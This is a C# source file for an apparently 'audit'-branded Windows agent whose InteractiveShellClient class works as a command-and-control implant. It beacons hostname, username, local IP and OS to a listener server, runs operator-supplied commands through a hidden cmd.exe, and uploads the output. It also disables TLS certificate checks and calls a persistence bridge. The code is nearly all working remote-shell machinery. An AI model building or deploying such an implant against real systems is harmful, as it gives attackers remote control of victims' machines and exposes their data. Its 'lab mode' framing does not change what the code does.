using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.Versioning;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

[SupportedOSPlatform("windows")]
internal static class InteractiveShellClient
{
    private static readonly JsonSerializerOptions JsonOptions = new()
    {
        WriteIndented = false
    };
    private const int ResultSubmitRetryCount = 3;
    private static readonly object WorkingDirectoryLock = new();
    private static string _sessionWorkingDirectory = Environment.CurrentDirectory;

    public static void RunStandalone(AuditOptions options)
    {
        if (!options.InteractiveShell)
        {
            return;
        }

        RunShellLoop(options, ResolveAgentId(options, report: null));
    }

    public static void RunIfConfigured(AuditReport report, AuditOptions options)
    {
        if (!options.InteractiveShell)
        {
            return;
        }

        RunShellLoop(options, ResolveAgentId(options, report));
    }

    private static void RunShellLoop(AuditOptions options, string agentId)
    {
        if (string.IsNullOrWhiteSpace(options.ServerUrl) || string.IsNullOrWhiteSpace(options.ListenerId))
        {
            throw new InvalidOperationException("Interactive shell requires --server and --listener.");
        }

        Uri serverUri = ValidateServerUri(options.ServerUrl);
        Console.WriteLine($"[+] Interactive shell enabled for agent '{agentId}'.");

        HttpClientHandler handler = BuildHttpHandler(serverUri);
        using var client = new HttpClient(handler)
        {
            BaseAddress = serverUri,
            Timeout = TimeSpan.FromSeconds(Math.Max(options.UploadTimeoutSeconds, 30))
        };

        while (true)
        {
            ShellPollResponse pollResponse;
            try
            {
                pollResponse = PollNextCommand(client, options.ListenerId, agentId);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[!] Shell poll failed: {ex.Message}");
                Thread.Sleep(TimeSpan.FromSeconds(Math.Max(options.ShellPollSeconds, 2)));
                continue;
            }

            if (!pollResponse.HasCommand)
            {
                Thread.Sleep(TimeSpan.FromSeconds(options.ShellPollSeconds));
                continue;
            }

            if (string.Equals(pollResponse.Command, "__exit__", StringComparison.Ordinal))
            {
                Console.WriteLine("[*] Interactive shell stop requested by server.");
                break;
            }

            try
            {
                ShellExecutionResult execution = ExecuteShellCommand(pollResponse.Command, options.ShellCommandTimeoutSeconds);
                SubmitCommandResultWithRetry(client, options.ListenerId, agentId, pollResponse.CommandId, pollResponse.Command, execution);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[!] Shell command handling failed: {ex.Message}");
                var failedExecution = new ShellExecutionResult(
                    string.Empty,
                    $"[X] Shell execution failure: {ex.Message}",
                    -1,
                    false);

                try
                {
                    SubmitCommandResultWithRetry(client, options.ListenerId, agentId, pollResponse.CommandId, pollResponse.Command, failedExecution);
                }
                catch (Exception submitEx)
                {
                    Console.Error.WriteLine($"[!] Failed to submit execution failure result: {submitEx.Message}");
                    Thread.Sleep(TimeSpan.FromSeconds(Math.Max(options.ShellPollSeconds, 2)));
                }
            }
        }
    }

    // ============================================================
    // Envoie les vraies informations système au serveur
    // ============================================================
    private static ShellPollResponse PollNextCommand(HttpClient client, string listenerId, string agentId)
    {
        string endpoint = $"/api/listeners/{Uri.EscapeDataString(listenerId)}/agents/{Uri.EscapeDataString(agentId)}/shell/poll";
        
        // Payload avec les vraies informations système
        var payload = new
        {
            hostname = Environment.MachineName,
            username = Environment.UserName,
            ip_address = GetLocalIPAddress(),
            operating_system = Environment.OSVersion.ToString()
        };
        
        using HttpResponseMessage response = client.PostAsync(endpoint, CreateJsonContent(payload)).GetAwaiter().GetResult();
        string body = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();

        if (!response.IsSuccessStatusCode)
        {
            throw new InvalidOperationException($"Shell poll failed with status {(int)response.StatusCode}: {body}");
        }

        return JsonSerializer.Deserialize<ShellPollResponse>(body) ?? new ShellPollResponse(null, null);
    }

    // ============================================================
    // Récupère l'adresse IP locale réelle (non-loopback)
    // ============================================================
    private static string GetLocalIPAddress()
    {
        try
        {
            // Méthode fiable: se connecter à un serveur externe pour obtenir l'IP locale
            using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0);
            socket.Connect("8.8.8.8", 65530);
            if (socket.LocalEndPoint is IPEndPoint endPoint)
            {
                return endPoint.Address.ToString();
            }
        }
        catch
        {
            // Fallback: chercher la première IP non-loopback
            try
            {
                foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                    {
                        // Ignorer les IP Docker/VirtualBox (172.x.x.x, 192.168.56.x, 192.168.109.x)
                        string ipStr = ip.ToString();
                        if (!ipStr.StartsWith("172.") && 
                            !ipStr.StartsWith("192.168.56.") && 
                            !ipStr.StartsWith("192.168.109.") &&
                            !ipStr.StartsWith("192.168.25."))
                        {
                            return ipStr;
                        }
                    }
                }
                // Si toutes les IP sont des IP virtuelles, prendre la première
                foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch
            {
                // Ignorer
            }
        }
        return "127.0.0.1";
    }

    private static void SubmitCommandResult(
        HttpClient client,
        string listenerId,
        string agentId,
        string? commandId,
        string? command,
        ShellExecutionResult execution)
    {
        string endpoint = $"/api/listeners/{Uri.EscapeDataString(listenerId)}/agents/{Uri.EscapeDataString(agentId)}/shell/result";
        var payload = new
        {
            command_id = commandId,
            command = command,
            stdout = execution.StdOut,
            stderr = execution.StdErr,
            exit_code = execution.ExitCode,
            timed_out = execution.TimedOut,
            completed_at = DateTimeOffset.UtcNow
        };

        using HttpResponseMessage response = client.PostAsync(endpoint, CreateJsonContent(payload)).GetAwaiter().GetResult();
        string body = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
        if (!response.IsSuccessStatusCode)
        {
            throw new InvalidOperationException($"Shell result upload failed with status {(int)response.StatusCode}: {body}");
        }
    }

    private static void SubmitCommandResultWithRetry(
        HttpClient client,
        string listenerId,
        string agentId,
        string? commandId,
        string? command,
        ShellExecutionResult execution)
    {
        Exception? lastError = null;
        for (int attempt = 1; attempt <= ResultSubmitRetryCount; attempt++)
        {
            try
            {
                SubmitCommandResult(client, listenerId, agentId, commandId, command, execution);
                return;
            }
            catch (Exception ex)
            {
                lastError = ex;
                Console.Error.WriteLine($"[!] Shell result submit attempt {attempt}/{ResultSubmitRetryCount} failed: {ex.Message}");
                if (attempt < ResultSubmitRetryCount)
                {
                    Thread.Sleep(TimeSpan.FromSeconds(attempt));
                }
            }
        }

        throw new InvalidOperationException(
            $"Shell result submit failed after {ResultSubmitRetryCount} attempts.",
            lastError);
    }

    private static ShellExecutionResult ExecuteShellCommand(string? command, int timeoutSeconds)
    {
        PersistCommandBridge.PersistExecutionResult persistExecution = PersistCommandBridge.TryExecute(command);
        if (persistExecution.Handled)
        {
            return new ShellExecutionResult(
                persistExecution.StdOut,
                persistExecution.StdErr,
                persistExecution.ExitCode,
                false);
        }

        string normalizedCommand = NormalizeOperatorCommand(command);
        string effectiveCommand = string.IsNullOrWhiteSpace(normalizedCommand) ? "echo." : normalizedCommand;
        string commandToRun = BuildCommandWithSessionDirectory(effectiveCommand);
        using var process = new Process();
        process.StartInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/c {commandToRun}",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        process.Start();
        Task<string> stdOutTask = process.StandardOutput.ReadToEndAsync();
        Task<string> stdErrTask = process.StandardError.ReadToEndAsync();
        Task<int> waitForExitTask = process.WaitForExitAsync().ContinueWith(
            _ => process.ExitCode,
            TaskScheduler.Default);

        int effectiveTimeoutSeconds = Math.Max(timeoutSeconds, 5);
        Task timeoutTask = Task.Delay(TimeSpan.FromSeconds(effectiveTimeoutSeconds));
        Task completedTask = Task.WhenAny(waitForExitTask, timeoutTask).GetAwaiter().GetResult();

        if (completedTask == timeoutTask)
        {
            try
            {
                process.Kill(entireProcessTree: true);
            }
            catch
            {
                // Best effort kill.
            }

            process.WaitForExit();
            string timedOutStdOut = stdOutTask.GetAwaiter().GetResult();
            string timedOutStdErr = stdErrTask.GetAwaiter().GetResult();
            if (!string.IsNullOrWhiteSpace(timedOutStdErr))
            {
                timedOutStdErr = $"{timedOutStdErr}{Environment.NewLine}";
            }
            timedOutStdErr += $"[!] Command timed out after {effectiveTimeoutSeconds}s.";

            return new ShellExecutionResult(timedOutStdOut, timedOutStdErr, -1, true);
        }

        int exitCode = waitForExitTask.GetAwaiter().GetResult();
        string stdOut = stdOutTask.GetAwaiter().GetResult();
        string stdErr = stdErrTask.GetAwaiter().GetResult();
        UpdateSessionDirectoryAfterCommand(effectiveCommand, exitCode);
        return new ShellExecutionResult(stdOut, stdErr, exitCode, false);
    }

    private static string BuildCommandWithSessionDirectory(string command)
    {
        lock (WorkingDirectoryLock)
        {
            string escapedDirectory = EscapeForCmdQuote(_sessionWorkingDirectory);
            return $"cd /d \"{escapedDirectory}\" && {command}";
        }
    }

    private static void UpdateSessionDirectoryAfterCommand(string command, int exitCode)
    {
        if (exitCode != 0)
        {
            return;
        }

        string trimmed = command.Trim();
        if (!trimmed.StartsWith("cd", StringComparison.OrdinalIgnoreCase))
        {
            return;
        }

        string? resolvedDirectory = ResolveCdTargetDirectory(trimmed);
        if (string.IsNullOrWhiteSpace(resolvedDirectory))
        {
            return;
        }

        lock (WorkingDirectoryLock)
        {
            _sessionWorkingDirectory = resolvedDirectory;
        }
    }

    private static string? ResolveCdTargetDirectory(string command)
    {
        string trimmed = command.Trim();
        string remainder = trimmed.Length > 2 ? trimmed[2..].Trim() : string.Empty;

        if (string.IsNullOrWhiteSpace(remainder) || remainder == ".")
        {
            lock (WorkingDirectoryLock)
            {
                return _sessionWorkingDirectory;
            }
        }

        if (remainder.Equals("..", StringComparison.Ordinal))
        {
            lock (WorkingDirectoryLock)
            {
                string? parent = Directory.GetParent(_sessionWorkingDirectory)?.FullName;
                return parent ?? _sessionWorkingDirectory;
            }
        }

        string candidate = remainder;
        if ((candidate.StartsWith("\"") && candidate.EndsWith("\"")) ||
            (candidate.StartsWith("'") && candidate.EndsWith("'")))
        {
            candidate = candidate[1..^1];
        }

        if (candidate.Equals("/d", StringComparison.OrdinalIgnoreCase))
        {
            return null;
        }

        if (candidate.StartsWith("/d ", StringComparison.OrdinalIgnoreCase))
        {
            candidate = candidate[3..].Trim();
            if ((candidate.StartsWith("\"") && candidate.EndsWith("\"")) ||
                (candidate.StartsWith("'") && candidate.EndsWith("'")))
            {
                candidate = candidate[1..^1];
            }
        }

        string fullPath;
        lock (WorkingDirectoryLock)
        {
            fullPath = Path.IsPathRooted(candidate)
                ? Path.GetFullPath(candidate)
                : Path.GetFullPath(Path.Combine(_sessionWorkingDirectory, candidate));
        }

        return Directory.Exists(fullPath) ? fullPath : null;
    }

    private static string EscapeForCmdQuote(string input) =>
        input.Replace("\"", "\"\"");

    private static string NormalizeOperatorCommand(string? command)
    {
        if (string.IsNullOrWhiteSpace(command))
        {
            return "echo.";
        }

        string trimmed = command.Trim();
        return trimmed switch
        {
            "ls" => "dir",
            "pwd" => "cd",
            _ => trimmed
        };
    }

    private static StringContent CreateJsonContent<T>(T payload) =>
        new(
            JsonSerializer.Serialize(payload, JsonOptions),
            Encoding.UTF8,
            "application/json");

    private static Uri ValidateServerUri(string serverUrl)
    {
        if (!Uri.TryCreate(serverUrl, UriKind.Absolute, out Uri? uri))
        {
            throw new InvalidOperationException("Upload server URL is invalid.");
        }

        if (uri.Scheme is not ("http" or "https"))
        {
            throw new InvalidOperationException("Upload server URL must use http or https.");
        }

        return new Uri($"{uri.Scheme}://{uri.Authority}");
    }

    private static HttpClientHandler BuildHttpHandler(Uri serverUri)
    {
        var handler = new HttpClientHandler();
        if (serverUri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase))
        {
            // Lab mode: allow self-signed TLS certificates used by local C2 listeners.
            handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
        }

        return handler;
    }

    private static string ResolveAgentId(AuditOptions options, AuditReport? report)
    {
        if (!string.IsNullOrWhiteSpace(options.AgentId))
        {
            return SanitizeId(options.AgentId);
        }

        if (report is null)
        {
            return SanitizeId($"shell_{Environment.MachineName}_{Environment.UserName}");
        }

        return SanitizeId($"audit_{report.System.MachineName}_{report.System.UserName}");
    }

    private static string SanitizeId(string value)
    {
        var builder = new StringBuilder(value.Length);
        foreach (char character in value.Trim())
        {
            builder.Append(char.IsLetterOrDigit(character) || character is '-' or '_' ? character : '_');
        }

        return builder.Length > 0 ? builder.ToString() : "audit_agent";
    }

    private sealed record ShellPollResponse(
        [property: JsonPropertyName("command_id")] string? CommandId,
        [property: JsonPropertyName("command")] string? Command)
    {
        public bool HasCommand => !string.IsNullOrWhiteSpace(CommandId) && !string.IsNullOrWhiteSpace(Command);
    }

    private sealed record ShellExecutionResult(string StdOut, string StdErr, int ExitCode, bool TimedOut);
}